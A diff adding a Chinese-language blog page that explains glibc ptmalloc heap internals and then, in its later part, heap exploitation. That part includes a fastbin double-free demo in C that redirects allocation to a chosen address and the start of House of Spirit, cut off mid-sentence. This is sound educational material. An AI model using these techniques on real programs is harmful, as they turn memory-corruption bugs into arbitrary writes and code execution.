@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="John Doe">
+
+
+
+
+
+<title>内存管理&amp;&amp;利用 | Hexo</title>
+
+
+
+    <link rel="icon" href="/ida.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Sivona&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Sivona&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">内存管理&amp;&amp;利用</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">John Doe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 30, 2020&nbsp;&nbsp;23:10:07</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/heap/">heap</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="chunk的组织"><a href="#chunk的组织" class="headerlink" title="chunk的组织"></a>chunk的组织</h1><h2 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h2><p><img src="/source/chunk.png" alt="">  </p>
+<p>chunk指针指向一个chunk的开始，mem指针才是真正返回给用户的内存指针，prev_size表示前一个chunk的size，程序可以使用这个值来找到前一个chunk的开始地址。  </p>
+<p>chunk的第二个域的最低一位为P，它表示前一个块是否在使用中，P为0则表示前一个chunk为空闲，这时chunk的第一个域prev_size才有效，当P为1时，表示前一个chunk正在使用中，prev_size无效，程序也就不可以得到前一个chunk的大小。不能对前一个chunk进行任何操作。ptmalloc分配的第一个块总是将P设为1，以防止程序引用到不存在的区域。    </p>
+<p>Chunk的第二个域的倒数第二个位为M，他表示当前chunk是从哪个内存区域获得的虚拟内存。M为1表示该chunk是从mmap映射区域分配的，否则是从heap区域分配的。  </p>
+<p>Chunk的第二个域倒数第三个位为A，表示该chunk属于主分配区或者非主分配区，如果属于非主分配区，将该位置为1，否则置为0。</p>
+<h2 id="空闲chunk结构"><a href="#空闲chunk结构" class="headerlink" title="空闲chunk结构"></a>空闲chunk结构</h2><p><img src="/source/freechunk.png" alt=""><br>当chunk空闲时，其M状态不存在<br>原本是用户数据区的地方存储了四个指针，指针fd指向后一个空闲的chunk，而bk指向前一个空闲的chunk，即双向链表。<br>对于large bin中的空闲chunk，还有两个指针，fd_nextsize和bk_nextsize，这两个指针用于加快在large  bin中查找最近匹配的空闲chunk。不同的chunk链表又是通过bins或者fastbins来组织  </p>
+<blockquote>
+<p>bins和fastbins的介绍在下面  </p>
+</blockquote>
+<h2 id="chunk中空间的复用"><a href="#chunk中空间的复用" class="headerlink" title="chunk中空间的复用"></a>chunk中空间的复用</h2><p>以32位系统为例，空闲时，一个chunk中至少需要4个size_t（4B）大小的空间，用来存储prev_size，size，fd和bk （见上图），也就是16B，chunk的大小要对齐到8B。  </p>
+<p>当一个chunk处于使用状态时，它的下一个chunk的prev_size域肯定是无效的。所以实际上，这个空间也可以被当前chunk使用。  </p>
+<p>一个使用中的chunk的大小的计算公式应该是：in_use_size = (用户请求大小+ 8 -4 ) align to 8B</p>
+<blockquote>
+<p>这里加8是因为需要存储prev_size和size，但又因为向下一个chunk“借”了4B，所以要减去4。  </p>
+</blockquote>
+<p>因为空闲的chunk 和使用中的chunk使用的是同一块空间。所以肯定要取其中最大者作为实际的分配空间。即最终的分配空间chunk_size  =  max(in_use_size,  16)。</p>
+<blockquote>
+<p>注意：按照边界标记法，可以有多个连续的并且正在被使用中的 chunk 块，但是不会有 多个连续的空闲 chunk 块，因为连续的多个空闲 chunk 块一定会合并成一个大的空闲 chunk 块。  </p>
+</blockquote>
+<h1 id="空闲chunk容器"><a href="#空闲chunk容器" class="headerlink" title="空闲chunk容器"></a>空闲chunk容器</h1><p>用户free掉的内存并不是都会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中的空闲的chunk，当用户进行下一次分配请求时，ptmalloc会首先试图在空闲的chunk中挑选一块给用户，这样就避免了频繁的系统调用。</p>
+<h2 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h2><p>ptmalloc将相似大小的chunk用双向链表链接起来，这样的一个链表被称为一个bin，使用数组储存。  </p>
+<p><img src="/source/bins.png" alt=""></p>
+<blockquote>
+<p>size_sz为4b的平台上&gt;=512b的chunk或8b的平台上&gt;=1024b的chunk为large bins  </p>
+</blockquote>
+<p>数组中的第一个为unsorted bin，数组中从2开始编号的前64个bin称为smallbins，同一个small bin中的chunk具有相同的大小。两个相邻的small bin中的chunk大小相差8bytes。small bins中的chunk按照最近使用顺序进行排列，最后释放的chunk被链接到链表的头部，而申请chunk是从链表尾部开始，这样，每一个chunk 都有相同的机会被ptmalloc选中。<br>Small  bins后面的bin被称作largebins。large bins中的每一个bin分别包含了一个给定范围内的chunk，其中的chunk按大小序排列。相同大小的chunk同样按照最近使用顺序排列。ptmalloc使用“smallest-first，best-fit”原则在空闲large bins中查找合适的chunk。  </p>
+<p>当空闲的chunk被链接到bin中的时候，ptmalloc会把表示该chunk是否处于使用中的标志P设为0</p>
+<blockquote>
+<p>注意，这个标志实际上处在下一个chunk中，fastbin不会</p>
+</blockquote>
+<p>同时ptmalloc还会检查它前后的chunk是否也是空闲的，如果是的话，ptmalloc会首先把它们合并为一个大的chunk，然后将合并后的chunk放到unstored bin中。</p>
+<blockquote>
+<p>要注意的是，并不是所有的chunk被释放后就立即被放到bin中。ptmalloc为了提高分配的速度，会把一些小的的chunk先放到一个叫做fastbins的容器内。  </p>
+</blockquote>
+<h2 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h2><p>不大于max_fast （默认值为64B）的chunk被释放后，首先会被放到fastbins 中，fastbins中的chunk并不改变它的使用标志P。这样也就无法将它们合并，当需要给用户分配的chunk小于或等于max_fast时，ptmalloc首先会在fastbins中查找相应的空闲块，然后才会去查找bins中的空闲chunk。<br>在某个特定的时候，ptmalloc会遍历fastbins中的chunk，将相邻的空闲chunk进行合并，并将合并后的chunk加入unsorted bin中，然后再将usorted bin里的chunk加入bins中。  </p>
+<h2 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h2><p>unsorted  bin的队列使用bins数组的第一个，<strong>如果被用户释放的chunk大于max_fast，或者fast bins中的空闲chunk合并后</strong>，这些chunk首先会被放到unsorted bin队列中，在进行<strong>malloc</strong>操作的时候，如果在fastbins中没有找到合适的chunk，则ptmalloc会先在unsorted bin中查找合适的空闲chunk，然后才查找bins。<br>如果unsorted bin不能满足分配要求。malloc便会将unsorted bin中的chunk加入bins中。然后再从bins中继续进行查找和分配过程。</p>
+<blockquote>
+<p>unsorted bin可以看做是bins的一个缓冲区，增加它只是为了加快分配的速度。  </p>
+</blockquote>
+<h2 id="Top-chunk-mmaped-chunk-last-remainder"><a href="#Top-chunk-mmaped-chunk-last-remainder" class="headerlink" title="Top chunk \ mmaped chunk \ last remainder"></a>Top chunk \ mmaped chunk \ last remainder</h2><p>并不是所有的chunk都按照上面的方式来组织，实际上，有三种例外情况。Top chunk，mmaped chunk和last remainder  </p>
+<h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><p>top chunk对于主分配区和非主分配区是不一样的。<br>对于<strong>非主分配区</strong>会预先从mmap区域分配一块较大的空闲内存模拟sub-heap，通过管理sub-heap来响应用户的需求，因为内存是按地址从低向高进行分配的，在空闲内存的最高处，必然存在着一块空闲chunk，叫做top chunk。<br>bins和fastbins都不能满足分配需要的时候，ptmalloc会设法在top chunk中分出一块内存给用户，如果top chunk本身不够大，分配程序会重新分配一个sub-heap，并将top chunk迁移到新的sub-heap上，新的sub-heap与已有的sub-heap用单向链表连接起来，然后在新的top chunk上分配所需的内存以满足分配的需要。<br>由于<strong>主分配区</strong>是唯一能够映射进程heap区域的分配区，它可以通过sbrk()来增大或是收缩进程heap的大小，ptmalloc在开始时会预先分配一块较大的空闲内存（也就是所谓的heap）。<br>如果向主分配区的top chunk申请内存，而top chunk中没有空闲内存，ptmalloc会调用sbrk()将的进程heap的边界brk上移，然后修改top chunk的大小。  </p>
+<h3 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h3><p>当需要分配的chunk足够大，而且fastbins和bins都不能满足要求，甚至top chunk本身也不能满足分配需求时，ptmalloc会使用mmap来直接使用内存映射来将页映射到进程空间。<br>这样分配的chunk在被free时将直接解除映射，于是就将内存归还给了操作系统，再次对这样的内存区的引用将导致segmentation  fault错误。这样的chunk也不会包含在任何bin中。  </p>
+<h3 id="Last-remainder"><a href="#Last-remainder" class="headerlink" title="Last remainder"></a>Last remainder</h3><p>当需要分配一个small chunk，但在small bins中找不到合适的chunk，如果last remainder chunk的大小大于所需的small chunk大小，last remainder chunk被分裂成两个chunk，其中一个chunk返回给用户，另一个chunk变成新的last remainder chuk。  </p>
+<h2 id="sbrk-mmap"><a href="#sbrk-mmap" class="headerlink" title="sbrk \ mmap"></a>sbrk \ mmap</h2><p>.bss 段之上的这块分配给用户程序的空间被称为 heap。start_brk 指向 heap 的开始，而 brk 指向 heap 的顶部。在使 malloc 之前， brk的值等于start_brk，也就是说heap大小为0。<br>ptmalloc在开始时，若请求的空间小于 mmap 分配阈值（mmap threshold，默认值为 128KB）时，主分配区会调用 sbrk()增加一块大小为 (128 KB + chunk_size) align 4KB 的空间作为 heap。非主分配区会调用 mmap 映射一块大小为 HEAP_MAX_SIZE （32 位系统上默认为 1MB， 64 位系统上默认为 64MB）的空间作为 sub-heap。  </p>
+<blockquote>
+<p>这就是前面所说的 ptmalloc 所维护的分配空间。当用户请求内存分配时，首先会在这个区 域内找一块合适的 chunk 给用户。当用户释放了 heap 中的 chunk 时，ptmalloc 又会使用 fast bins 和 bins 来组织空闲 chunk。以备用户的下一次分配。  </p>
+</blockquote>
+<p>若需要分配的 chunk 大小小于 mmap 分配阈值，而 heap 空间又不够，则此时主分配区会通过 sbrk()调用来增加 heap 大小，非主 分配区会调用 mmap 映射一块新的 sub-heap，也就是增加 top chunk 的大小，每次 heap 增 加的值都会对齐到 4KB。<br>当用户的请求超过 mmap 分配阈值，并且主分配区使用 sbrk()分配失败的时候，或是非 主分配区在 top chunk 中不能分配到需要的内存时，ptmalloc 会尝试使用 mmap()直接映射一 块内存到进程内存空间。使用 mmap()直接映射的 chunk 在释放时直接解除映射，而不再属 于进程的内存空间。任何对该内存的访问都会产生段错误。而在 heap 中或是 sub-heap 中分 配的空间则可能会留在进程内存空间内，还可以再次引用（当然是很危险的）。  </p>
+<h2 id="内存分配算法"><a href="#内存分配算法" class="headerlink" title="内存分配算法"></a>内存分配算法</h2><p>以32位系统为例</p>
+<ul>
+<li>小于等于 64 字节：用 pool 算法分配。   </li>
+<li>64 到 512 字节之间：在最佳匹配算法分配和 pool 算法分配中取一种合适的。   </li>
+<li>大于等于 512 字节：用最佳匹配算法分配。   </li>
+<li>大于等于 mmap 分配阈值（默认值 128KB）：根据设置的 mmap 的分配策略进行分配， 如果没有开启 mmap 分配阈值的动态调整机制，大于等于 128KB 就直接调用 mmap分配。否则，大于等于 mmap 分配阈值时才直接调用 mmap()分配。   </li>
+</ul>
+<h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><ol>
+<li>获取分配区的锁，查看是否已经存在一个分配区，如果存在尝试对该分配区加锁，如果加锁成功，使用该分配区分配内存，否则，该线程搜索分配区循环链表试图获得一个空闲（没有加锁）的分配区。如果所有的分配区都已经加锁，那么 ptmalloc 会开辟一个新的分配区。开辟出来的新分配区一定为非主分配区，因为主分配区是从父进程那里继承来的。开辟非主分配区时会调用 mmap()创建一个 sub-heap，并设置好 top chunk。</li>
+<li>将用户的请求大小转换为实际需要分配的 chunk 空间大小。 </li>
+<li>判断所需分配chunk的大小是否满足chunk_size &lt;= max_fast (max_fast 默认为64B)， 如果是的话，则转下一步，否则跳到第 5 步。 </li>
+<li>首先尝试在 fast bins 中取一个所需大小的 chunk 分配给用户。如果可以找到，则分配结束。否则转到下一步。 </li>
+<li>判断所需大小是否处在 small bins 中，即判断 chunk_size &lt; 512B 是否成立。如果 chunk 大小处在 small bins 中，则转下一步，否则转到第7步。 </li>
+<li>根据所需分配的 chunk 的大小，找到具体所在的某个 small bin，从该 bin 的尾部摘 取一个恰好满足大小的 chunk。若成功，则分配结束，否则，转到下一步。</li>
+<li>到了这一步，说明需要分配的是一块大的内存，或者 small bins 中找不到合适的 chunk。<br>于是，ptmalloc 首先会遍历 fast bins 中的 chunk，将相邻的 chunk 进行合并， 并链接到 unsorted bin 中，然后遍历 unsorted bin 中的 chunk，如果 unsorted bin 只有一个chunk，并且这个 chunk 在上次分配时被使用过，并且所需分配的 chunk 大小属于 small bins，并且 chunk 的大小大于等于需要分配的大小，这种情况下就直接将该 chunk 进行切割，分配结束，否则将根据 chunk 的空间大小将其放入 small bins 或是 large bins 中，遍历完成后，转入下一步。 </li>
+<li>到了这一步，说明需要分配的是一块大的内存，或者 small bins 和 unsorted bin 中都找不到合适的 chunk，并且 fast bins 和 unsorted bin 中所有的 chunk 都清除干净 了。从 large bins 中按照“smallest-first，best-fit”原则，找一个合适的 chunk，从中划分一块所需大小的 chunk，并将剩下的部分链接回到 bins 中。若操作成功，则分配结束，否则转到下一步。 </li>
+<li>如果搜索 fast bins 和 bins 都没有找到合适的 chunk，那么就需要操作 top chunk 来 进行分配了。判断 top chunk 大小是否满足所需 chunk 的大小，如果是，则从 top chunk 中分出一块来。否则转到下一步。 </li>
+<li>到了这一步，说明 top chunk 也不能满足分配要求，所以，于是就有了两个选择: 如果是主分配区，调用 sbrk()，增加 top chunk 大小；如果是非主分配区，调用 mmap 来分配一个新的 sub-heap，增加 top chunk 大小；或者使用 mmap()来直接分配。在这里，需要依靠 chunk 的大小来决定到底使用哪种方法。判断所需分配的 chunk 大小是否大于等于 mmap 分配阈值，如果是的话，则转下一步，调用 mmap 分配，否则跳到第 12 步，增加 top chunk 的大小。</li>
+<li>使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间。<br>然后将内存指针返回给用户。 </li>
+<li>判断是否为第一次调用 malloc，若是主分配区，则需要进行一次初始化工作，分配一块大小为(chunk_size + 128KB) align 4KB 大小的空间作为初始的 heap。若已经初始化过了，主分配区则调用 sbrk()增加 heap 空间，分主分配区则在 top chunk 中切割出一个 chunk，使之满足分配需求，并将内存指针返回给用户。  </li>
+</ol>
+<h4 id="总结一下："><a href="#总结一下：" class="headerlink" title="总结一下："></a>总结一下：</h4><p>ptmalloc 有可能会在两个地方为用户分配内存空间。在第一次分配内存时，一般情况下只存在一个主分配区，brk 值等于 start_brk，所以实际上 heap 大小为 0，top chunk 大小也是 0。这时，如果不增加 heap 大小，就不能满足任何分配要求。<br>若用户的请求的内存大小小于 mmap 分配阈值， 则 ptmalloc 会初始 heap。然后在 heap 中分配空间给用户，以后的分配就基于这个 heap 进行。<br>若第一次用户的请求就大于 mmap 分配阈值，则 ptmalloc 直接使用 mmap()分配 一块内存给用户，而 heap 也就没有被初始化，直到用户第一次请求小于 mmap 分配阈 值的内存分配。<br>第一次以后的分配就比较复杂了，简单说来：  </p>
+<ul>
+<li>ptmalloc 首先会查找fast bins。  </li>
+<li>如果不能找到匹配的 chunk，则查找 small bins。 </li>
+<li>若还是不行，合并 fast bins，把 chunk 加入 unsorted bin，在 unsorted bin 中查找  </li>
+<li>若还是不行，把 unsorted bin 中的 chunk 全 加入 large bins 中，并查找 large bins。在 fast bins 和 small bins 中的查找都需要精确匹配， 而在 large bins 中查找时，则遵循“smallest-first，best-fit”的原则  </li>
+<li>若以上方法都失败了，则 ptmalloc 会考虑使用 top chunk。若 top chunk 也不能满足分配要求。而且所需 chunk 大小大于 mmap 分配阈值，则使用 mmap 进行分配。否则增加 heap，增大 top chunk。以满足分配要求。  <h2 id="内存回收"><a href="#内存回收" class="headerlink" title="内存回收"></a>内存回收</h2></li>
+</ul>
+<p>free() 函数接受一个指向分配区域的指针作为参数，释放该指针所指向的 chunk。而具体的释放方法则看该 chunk 所处的位置和该 chunk 的大小。  </p>
+<h3 id="free-具体步骤"><a href="#free-具体步骤" class="headerlink" title="free()具体步骤"></a>free()具体步骤</h3><ol>
+<li>free()函数同样首先需要获取分配区的锁，来保证线程安全。 </li>
+<li>判断传入的指针是否为 0，如果为 0，则什么都不做，直接 return。否则转下一步。 </li>
+<li>判断所需释放的 chunk 是否为 mmaped chunk，如果是，则调用 munmap()释放 mmaped chunk，解除内存空间映射，该空间不再有效。如果开启了 mmap 分配阈值的动态调整机制，并且当前回收的 chunk 大小大于 mmap 分配阈值，将 mmap 分配阈值设置为该 chunk 的大小，将 mmap 收缩阈值设定为 mmap 分配阈值的 2 倍，释放完成，否则跳到下一步。</li>
+<li>判断 chunk 的大小和所处的位置，若 chunk_size &lt;= max_fast，并且 chunk 并不位于 heap 的顶部，也就是说并不与 top chunk 相邻，则转到下一步，否则跳到第 6 步。 <blockquote>
+<p>因为与 top chunk 相邻的小 chunk 也和 top chunk 进行合并，所以这里不仅需要判断大小，还需要判断相邻情况</p>
+</blockquote>
+</li>
+<li>将 chunk 放到 fast bins 中，chunk 放入到 fast bins 中时，并不修改该 chunk 使用状态位 P。也不与相邻的 chunk 进行合并。只是放进去，如此而已。这一步做完之后释放便结束了，程序从 free()函数中返回。 </li>
+<li>判断前一个 chunk 是否处在使用中，如果前一个块也是空闲块，则合并。并转下一步。</li>
+<li>判断当前释放 chunk 的下一个块是否为 top chunk，如果是，则转第 9 步，否则转下一步。 </li>
+<li>判断下一个 chunk 是否处在使用中，如果下一个 chunk 也是空闲的，则合并，并将合并后的 chunk 放到 unsorted bin 中。注意，这里在合并的过程中，要更新 chunk 的大小，以反映合并后的 chunk 的大小。并转到第 10 步。 </li>
+<li>如果执行到这一步，说明释放了一个与 top chunk 相邻的 chunk。则无论它有多大， 都将它与 top chunk 合并，并更新 top chunk 的大小等信息。转下一步。 </li>
+<li>判断合并后的 chunk 的大小是否大于 FASTBIN_CONSOLIDATION_THRESHOLD（默认 64KB）， 如果是的话，则会触发进行 fast bins 的合并操作，fast bins 中的 chunk 将被遍历，并与相邻的空闲 chunk 进行合并，合并后的 chunk 会被放到 unsorted bin 中。 fast bins 将变为空，操作完成之后转下一步。 </li>
+<li>判断 top chunk 的大小是否大于 mmap 收缩阈值（默认为 128KB）， 如果是的话，对于主分配区，则会试图归还 top chunk 中的一部分给操作系统。但是最先分配的 128KB 空间是不会归还的，ptmalloc 会一直管理这部分内存，用于响应用户的分配 请求；如果为非主分配区，会进行 sub-heap 收缩，将 top chunk 的一部分返回给操作系统，如果 top chunk 为整个 sub-heap，会把整个 sub-heap 还回给操作系统。做完这一步之后，释放结束，从 free() 函数退出。  <blockquote>
+<p>可以看出，收缩堆的条件是当前 free 的 chunk 大小加上前后能合并 chunk 的大小大于 64k，并且要 top chunk 的大小要达到 mmap 收缩阈值，才有可能收缩堆。  </p>
+</blockquote>
+</li>
+</ol>
+<h1 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h1><h2 id="分配-fast-bin-chunk"><a href="#分配-fast-bin-chunk" class="headerlink" title="分配 fast bin chunk"></a>分配 fast bin chunk</h2><p>如果所需的 chunk 大小小于等于 fast bins 中的最大 chunk 大小，首先尝试从 fast bins 中 分配 chunk。<br>首先根据所需 chunk 的大小获得该 chunk 所属 fast bin 的index，根据该 index 获得所需 fast bin 的空闲 chunk 链表的头指针，然后将头指针的下一个 chunk 作为空闲 chunk 链表的头部。为了加快从 fast bins 中分配 chunk，处于 fast bins 中 chunk 的状态仍然保持为 inuse 状态，避免被相邻的空闲chunk合并，从fast bins中分配chunk，只需取出第一个chunk，并调用chunk2mem() 函数返回用户所需的内存块。  </p>
+<h2 id="分配-small-bin-chunk"><a href="#分配-small-bin-chunk" class="headerlink" title="分配 small bin chunk"></a>分配 small bin chunk</h2><p>如果分配的 chunk 属于 small bin，首先查找 chunk 所对应 small bins 数组的 index，然后 根据 index 获得某个 small bin 的空闲 chunk 双向循环链表表头，然后将最后一个 chunk 赋值 给 victim，如果 victim 与表头相同，表示该链表为空，不能从 small bin 的空闲 chunk 链表中 分配，这里不处理，等后面的步骤来处理。如果 victim 与表头不同，有两种情况，如果 victim 为 0，表示 small bin 还没有初始化为双向循环链表，调用 malloc_consolidate()函数将 fast bins 中的 chunk 合并。否则，将 victim 从 small bin 的双向循环链表中取出，设置 victim chunk 的 inuse 标志，该标志处于 victim chunk 的下一个相邻 chunk 的 size 字段的第一个 bit。从 small bin 中取出一个 chunk 也可以用 unlink()宏函数。<br>接着判断当前分配区是否为非主分配区，如果是，将 victim chunk 的 size 字段中的表示 非主分配区的标志bit清零，最后调用chunk2mem()函数获得chunk的实际可用的内存指针， 将该内存指针返回给应用层。到此从 small bins 中分配 chunk 的工作完成了，但我们看到， 当对应的 small bin 中没有空闲 chunk，或是对应的 small bin 还没有初始化完成，并没有获取 到 chunk，这两种情况都需要后面的步骤来处理。   </p>
+<h2 id="分配-large-bin-chunk"><a href="#分配-large-bin-chunk" class="headerlink" title="分配 large bin chunk"></a>分配 large bin chunk</h2><p>GGGGGGGGGGGGGG</p>
+<h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><p>前提:</p>
+<ul>
+<li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞  </li>
+<li>漏洞发生于 fastbin 类型的 chunk 中    </li>
+</ul>
+<p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。  </p>
+<h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。  </p>
+<p>前提：</p>
+<ul>
+<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空  </li>
+<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。  <blockquote>
+<p>如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。  </p>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Another simple check: make sure the top of the bin is not the</span><br><span class="line">       record we are going to add (i.e., double free).  *&#x2F;</span><br><span class="line">    if (__builtin_expect (old &#x3D;&#x3D; p, 0))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr &#x3D; &quot;double free or corruption (fasttop)&quot;;</span><br><span class="line">        goto errout;</span><br><span class="line">&#125;  </span><br><span class="line">&#96;&#96;&#96;    </span><br><span class="line"></span><br><span class="line">### 举个栗子：</span><br></pre></td></tr></table></figure>
+<p>typedef struct _chunk<br>{<br>    long long pre_size;<br>    long long size;<br>    long long fd;<br>    long long bk;<br>} CHUNK,*PCHUNK;</p>
+<p>CHUNK bss_chunk;</p>
+<p>int main(void)<br>{<br>    void <em>chunk1,</em>chunk2,<em>chunk3;<br>    void *chunk_a,</em>chunk_b;</p>
+<pre><code>bss_chunk.size=0x21;//绕过_int_malloc 中的校验
+chunk1=malloc(0x10);
+chunk2=malloc(0x10);
+
+free(chunk1);
+free(chunk2);
+free(chunk1);
+
+chunk_a=malloc(0x10);//chunk1
+*(long long *)chunk_a=&amp;bss_chunk;//修改fd
+malloc(0x10);//chunk2
+malloc(0x10);//chunk1
+chunk_b=malloc(0x10);//bss_chunk
+printf(&quot;%p&quot;,chunk_b);
+return 0;</code></pre><p>}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">第三次free后：  </span><br><span class="line"></span><br><span class="line">![](&#x2F;source&#x2F;double_free.png)  </span><br><span class="line">### 总结：  </span><br><span class="line">通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## House Of Spirit  </span><br><span class="line">House of Spirit 是 the Malloc Maleficarum 中的一种技术。</span><br><span class="line"></span><br><span class="line">该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</span><br><span class="line"></span><br><span class="line">要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即:  </span><br><span class="line">* fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 